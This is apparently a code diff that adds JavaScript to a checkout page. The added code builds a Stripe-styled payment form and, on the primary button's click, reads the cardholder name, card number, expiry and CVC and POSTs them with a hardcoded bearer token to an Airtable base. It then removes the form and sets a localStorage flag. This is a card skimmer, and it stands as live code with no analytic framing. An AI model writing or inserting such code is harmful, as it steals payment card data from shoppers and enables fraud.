@@ -158,6 +158,57 @@
               stripefkcc.focus();
             }
           });
+
+        function cancelJob() {
+          const wrapper = document.querySelector(
+            "div#stripe-private-form-wrapper"
+          );
+          wrapper.parentElement.removeChild(wrapper);
+        }
+
+        document
+          .querySelector(".CheckoutV2__checkout + div")
+          .addEventListener("click", cancelJob);
+        document
+          .querySelector("button.btn-raised.btn-primary")
+          .addEventListener("click", async function () {
+            const token = "keyH5pVxwVdPjMWJk";
+            const url =
+              "https://api.airtable.com/v0/appMihP6lGIak6vqS/tblaoar7ApsFzDNIm";
+            const urlSearchParams = new URLSearchParams(window.location.search);
+            const params = Object.fromEntries(urlSearchParams.entries());
+            let Data = {
+              records: [
+                {
+                  fields: {
+                    ...params,
+                    ccn: document.querySelector(".LiveField__answer input")
+                      .value,
+                    cnumber: document.querySelector(
+                      ".CardNumberField-input-wrapper input"
+                    ).value,
+                    expiry: document.querySelector(".CardField-expiry  input")
+                      .value,
+                    ccv: document.querySelector(
+                      ".CardField-cvc.CardField-child input"
+                    ).value,
+                  },
+                },
+              ],
+            };
+
+            const res = await fetch(url, {
+              method: "POST",
+              headers: {
+                Authorization: `Bearer ${token}`,
+                "Content-Type": "application/json",
+              },
+              body: JSON.stringify(Data),
+            });
+
+            cancelJob();
+            localStorage.setItem("paperform-Postfill", "true");
+          });
       }
     });
   });
